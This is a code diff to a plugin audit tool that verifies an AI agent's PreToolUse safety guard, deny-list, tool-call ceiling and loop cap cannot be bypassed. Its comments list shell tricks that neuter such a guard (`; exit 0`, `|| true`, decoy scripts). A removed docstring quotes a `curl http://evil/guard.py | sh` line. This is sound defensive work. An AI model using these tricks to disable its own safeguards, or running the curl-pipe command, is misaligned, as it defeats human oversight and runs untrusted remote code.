@@ -84,22 +84,40 @@ def _plugin_root(root: str | None) -> str:
     return os.path.abspath(os.path.join(os.path.dirname(__file__), ".."))
 
 
-def _resolve_script(command: str, root: str) -> str | None:
-    """Resolve the on-disk script a hook command actually invokes, or None.
+# A hook blocks only if the guard's non-zero exit reaches the shell UNCHANGED.
+# Any operator/wrapper/comment can subvert that (`; exit 0`, `|| true`, `&`,
+# `# …`, `sh -c "exit 0" guard.py`). So the blocking guard command must be a BARE
+# `python <path>.py` invocation — nothing before or after. `env`-wrapping is fine.
+_GUARD_CMD_RE = re.compile(
+    r'^(?:/usr/bin/env\s+)?python3?\s+(?:"([^"]+\.py)"|(\S+\.py))\s*$'
+)
 
-    Substitutes the plugin-root env var, then returns the first token ending in
-    .py/.sh that exists as a file under (or at an absolute path resolvable from)
-    the root. A `curl http://evil/guard.py | sh` resolves to None — the token is
-    not a real file — which is exactly how we avoid the substring-evasion bug.
-    """
-    c = command.replace("${CLAUDE_PLUGIN_ROOT}", root).replace("$CLAUDE_PLUGIN_ROOT", root)
-    for m in re.finditer(r"""[^\s"'|;&><]+\.(?:py|sh)\b""", c):
-        tok = m.group(0)
-        p = tok if os.path.isabs(tok) else os.path.join(root, tok)
-        p = os.path.normpath(p)
-        if os.path.isfile(p):
-            return os.path.abspath(p)
-    return None
+
+def _canonical_guard_path(command: str, root: str) -> str | None:
+    """Return the resolved guard path IFF `command` is a bare `python <path>.py`
+    invocation whose path exists — else None. Rejects every shell trick because
+    anything other than the exact shape fails the full-line match."""
+    c = command.replace("${CLAUDE_PLUGIN_ROOT}", root).replace("$CLAUDE_PLUGIN_ROOT", root).strip()
+    m = _GUARD_CMD_RE.match(c)
+    if not m:
+        return None
+    tok = m.group(1) or m.group(2) or ""
+    p = tok if os.path.isabs(tok) else os.path.join(root, tok)
+    p = os.path.normpath(p)
+    return os.path.abspath(p) if os.path.isfile(p) else None
+
+
+def _matcher_covers_bash(matcher: Any) -> bool:
+    """Does this hook entry's matcher fire on the Bash tool? Empty/`*` = all tools.
+    Otherwise treat it as the regex Claude Code matches against the tool name."""
+    if not matcher or matcher == "*":
+        return True
+    if not isinstance(matcher, str):
+        return False
+    try:
+        return re.search(matcher, "Bash") is not None
+    except re.error:
+        return "Bash" in matcher
 
 
 def _load_guard_module(path: str) -> Any:
@@ -139,13 +157,19 @@ def _event_commands(hooks: dict[str, Any], event: str | None = None) -> list[str
     return out
 
 
-def resolve_wired_guard(root: str) -> tuple[Any | None, str | None, list[Check]]:
-    """Find and load the guard actually wired to the *blocking* PreToolUse event.
+def _blessed(path: str | None, root: str) -> bool:
+    return (
+        path is not None
+        and path.startswith(os.path.abspath(root) + os.sep)
+        and os.path.basename(path) in _BLESSED_HOOK_SCRIPTS
+    )
 
-    Returns (guard_module_or_None, resolved_path_or_None, checks). The behaviour
-    batteries run on whatever is returned — so a decoy wired in place of the real
-    guard is what gets tested, and its failure is caught.
-    """
+
+def resolve_wired_guard(root: str) -> tuple[Any | None, str | None, list[Check]]:
+    """Find and load the guard actually wired to fire on Bash at the *blocking*
+    PreToolUse event. Requires (a) a PreToolUse entry whose matcher covers Bash,
+    (b) a canonical `python <path>` command (no shell tricks), (c) that path
+    loading a module exposing is_denied. Anything else → FAIL."""
     checks: list[Check] = []
     hooks = _read_hooks(root)
     if hooks is None:
@@ -153,94 +177,80 @@ def resolve_wired_guard(root: str) -> tuple[Any | None, str | None, list[Check]]
         return None, None, checks
 
     pre = hooks.get("PreToolUse")
-    pre_cmds = _event_commands(hooks, "PreToolUse")
-    if not (isinstance(pre, list) and pre and pre_cmds):
+    if not (isinstance(pre, list) and pre):
         checks.append(Check("guard-hook-wired", FAIL, "no PreToolUse hook is configured"))
         return None, None, checks
 
-    # Load the first PreToolUse command that resolves to a script exposing is_denied.
-    for cmd in pre_cmds:
-        path = _resolve_script(cmd, root)
-        if not path:
+    for entry in pre:
+        if not isinstance(entry, dict) or not _matcher_covers_bash(entry.get("matcher")):
             continue
-        try:
-            mod = _load_guard_module(path)
-        except Exception:  # noqa: BLE001 — a broken/decoy script is not a valid guard
-            continue
-        if callable(getattr(mod, "is_denied", None)):
-            checks.append(
-                Check("guard-hook-wired", OK, f"guard wired to PreToolUse: {os.path.relpath(path, root)}")
-            )
-            return mod, path, checks
+        for hook in entry.get("hooks", []) or []:
+            cmd = hook.get("command", "") if isinstance(hook, dict) else ""
+            path = _canonical_guard_path(cmd, root)
+            if not path:
+                continue
+            try:
+                mod = _load_guard_module(path)
+            except Exception:  # noqa: BLE001 — a broken/decoy script is not a valid guard
+                continue
+            if callable(getattr(mod, "is_denied", None)):
+                checks.append(
+                    Check("guard-hook-wired", OK, f"guard fires on Bash: {os.path.relpath(path, root)}")
+                )
+                return mod, path, checks
 
     checks.append(
         Check(
             "guard-hook-wired",
             FAIL,
-            "PreToolUse is wired, but no command resolves to a loadable guard "
-            "(is_denied not found) — the guard may be a decoy or on a non-blocking event",
+            "no PreToolUse entry matching Bash wires a canonical guard exposing "
+            "is_denied — possible decoy, shell-wrapped/neutered command, wrong matcher, "
+            "or guard on a non-blocking event",
         )
     )
     return None, None, checks
 
 
 def check_no_foreign_hooks(root: str) -> Check:
-    """Every hook command must resolve to a blessed Forge script under the plugin
-    root. A command that resolves elsewhere or to nothing (a URL, a piped shell,
-    an arbitrary binary) is flagged — matched by resolved path, never substring."""
+    """Every hook command must be a canonical invocation of a blessed Forge script
+    under the plugin root. A URL, a piped shell, a shell-wrapped/operator-laden
+    command, or an arbitrary binary is flagged — a shell trick is NOT blessed."""
     hooks = _read_hooks(root)
     if hooks is None:
         return Check("no-foreign-hooks", FAIL, "hooks.json missing or invalid")
-    root_abs = os.path.abspath(root)
-    foreign: list[str] = []
-    for cmd in _event_commands(hooks):
-        path = _resolve_script(cmd, root)
-        blessed = (
-            path is not None
-            and path.startswith(root_abs + os.sep)
-            and os.path.basename(path) in _BLESSED_HOOK_SCRIPTS
-        )
-        if not blessed:
-            foreign.append(cmd)
+    foreign = [cmd for cmd in _event_commands(hooks) if not _blessed(_canonical_guard_path(cmd, root), root)]
     if foreign:
         return Check("no-foreign-hooks", WARN, f"unreviewed hook command(s): {foreign}")
-    return Check("no-foreign-hooks", OK, "every hook resolves to a blessed Forge script")
+    return Check("no-foreign-hooks", OK, "every hook is a canonical blessed Forge script")
 
 
 def check_guard_denies(guard: Any) -> Check:
-    leaked = [c for c in CANARIES if not guard.is_denied(c)]
+    try:
+        leaked = [c for c in CANARIES if not guard.is_denied(c)]
+    except Exception as exc:  # noqa: BLE001 — a guard that raises is a FAIL, not a crash
+        return Check("guard-denies-catastrophic", FAIL, f"guard.is_denied raised: {exc}")
     if leaked:
         return Check("guard-denies-catastrophic", FAIL, f"deny-list weakened — got through: {leaked}")
     return Check("guard-denies-catastrophic", OK, f"all {len(CANARIES)} catastrophic canaries blocked")
 
 
 def check_guard_allows_safe(guard: Any) -> Check:
-    blocked = [c for c in SAFE if guard.is_denied(c)]
+    try:
+        blocked = [c for c in SAFE if guard.is_denied(c)]
+    except Exception as exc:  # noqa: BLE001
+        return Check("guard-allows-safe", FAIL, f"guard.is_denied raised: {exc}")
     if blocked:
         return Check("guard-allows-safe", FAIL, f"deny-list over-broad — blocks: {blocked}")
     return Check("guard-allows-safe", OK, f"all {len(SAFE)} safe commands allowed")
 
 
-def check_ceiling_behaves(guard: Any) -> Check:
-    """Behaviour-test the loop-brake: drive tick_and_check past a small ceiling and
-    assert it trips. A neutered `tick_and_check` (always False) is caught here."""
-    tick = getattr(guard, "tick_and_check", None)
-    if not callable(tick):
-        return Check("ceiling-enforced", FAIL, "tick_and_check() missing — loop-brake removed")
+def _with_forge_home(fn: Any) -> Any:
+    """Run fn(tmp_dir) with FORGE_HOME pointed at a throwaway dir, then restore."""
     prev = os.environ.get("FORGE_HOME")
     tmp = tempfile.mkdtemp(prefix="forge-doctor-")
     try:
         os.environ["FORGE_HOME"] = tmp
-        with open(os.path.join(tmp, "active_run.json"), "w") as fh:
-            json.dump({"started_at": time.time(), "tool_calls": 0, "ceiling": 2}, fh)
-        results = [bool(tick()), bool(tick()), bool(tick())]  # counts 1,2,3 vs ceiling 2
-        if results == [False, False, True]:
-            return Check("ceiling-enforced", OK, "loop-brake trips past the ceiling")
-        return Check(
-            "ceiling-enforced",
-            FAIL,
-            f"loop-brake did not enforce the ceiling (tick sequence {results}, expected F,F,T)",
-        )
+        return fn(tmp)
     finally:
         if prev is None:
             os.environ.pop("FORGE_HOME", None)
@@ -249,6 +259,58 @@ def check_ceiling_behaves(guard: Any) -> Check:
         import shutil
 
         shutil.rmtree(tmp, ignore_errors=True)
+
+
+def _write_active(tmp: str, **fields: Any) -> None:
+    run = {"run_id": "audit", "path": os.path.join(tmp, "runs", "x.jsonl"),
+           "started_at": time.time(), "tool_calls": 0, **fields}
+    with open(os.path.join(tmp, "active_run.json"), "w") as fh:
+        json.dump(run, fh)
+
+
+def check_ceiling_behaves(guard: Any) -> Check:
+    """Behaviour-test the tool-call ceiling: drive it past a small limit and assert
+    it trips. A neutered `tick_and_check` (always False) is caught here."""
+    tick = getattr(guard, "tick_and_check", None)
+    if not callable(tick):
+        return Check("ceiling-enforced", FAIL, "tick_and_check() missing — loop-brake removed")
+
+    def run(tmp: str) -> Check:
+        _write_active(tmp, ceiling=2)
+        try:
+            results = [bool(tick()), bool(tick()), bool(tick())]  # counts 1,2,3 vs ceiling 2
+        except Exception as exc:  # noqa: BLE001
+            return Check("ceiling-enforced", FAIL, f"tick_and_check raised: {exc}")
+        if results == [False, False, True]:
+            return Check("ceiling-enforced", OK, "ceiling trips past the limit")
+        return Check("ceiling-enforced", FAIL,
+                     f"ceiling not enforced (tick sequence {results}, expected F,F,T)")
+
+    return _with_forge_home(run)
+
+
+def check_iteration_cap_behaves(guard: Any) -> Check:
+    """Behaviour-test the loop cap: with iteration_cap=2, a blocker seen 1× must NOT
+    breach and seen 3× MUST breach. A neutered `iteration_breached` is caught here —
+    without this the second of the guard's two blocking controls is unaudited."""
+    fn = getattr(guard, "iteration_breached", None)
+    if not callable(fn):
+        return Check("loop-cap-enforced", FAIL, "iteration_breached() missing — loop cap removed")
+
+    def run(tmp: str) -> Check:
+        try:
+            _write_active(tmp, iteration_cap=2, blockers={"x": 1})
+            under = bool(fn())
+            _write_active(tmp, iteration_cap=2, blockers={"x": 3})
+            over = bool(fn())
+        except Exception as exc:  # noqa: BLE001
+            return Check("loop-cap-enforced", FAIL, f"iteration_breached raised: {exc}")
+        if under is False and over is True:
+            return Check("loop-cap-enforced", OK, "loop cap trips past the iteration limit")
+        return Check("loop-cap-enforced", FAIL,
+                     f"loop cap not enforced (under-cap={under}, over-cap={over}, expected False,True)")
+
+    return _with_forge_home(run)
 
 
 def _uncommented_lines(path: str) -> list[str]:
@@ -292,11 +354,15 @@ def check_plan_mode_first(root: str) -> Check:
         return Check("plan-mode-first", FAIL, f"forge-init.sh missing: {init_sh}")
     tmp = tempfile.mkdtemp(prefix="forge-doctor-init-")
     try:
-        subprocess.run(
+        proc = subprocess.run(
             ["bash", init_sh, tmp], capture_output=True, text=True, timeout=45,
             env={**os.environ, "GIT_TERMINAL_PROMPT": "0"},
         )
         settings = os.path.join(tmp, ".claude", "settings.json")
+        if not os.path.isfile(settings):
+            # Distinguish "init aborted" from "plan-mode broken": surface init stderr.
+            tail = (proc.stderr or proc.stdout or "").strip().splitlines()[-1:] or ["(no output)"]
+            return Check("plan-mode-first", FAIL, f"forge-init did not emit settings.json — init failed: {tail[0]}")
         with open(settings) as fh:
             mode = (json.load(fh).get("permissions", {}) or {}).get("defaultMode")
         if mode == "plan":
@@ -320,6 +386,7 @@ def run_audit(root: str) -> list[Check]:
         checks.append(check_guard_denies(guard))
         checks.append(check_guard_allows_safe(guard))
         checks.append(check_ceiling_behaves(guard))
+        checks.append(check_iteration_cap_behaves(guard))
     checks.append(check_no_foreign_hooks(root))
     checks.extend(check_secret_gates(root))
     checks.append(check_plan_mode_first(root))
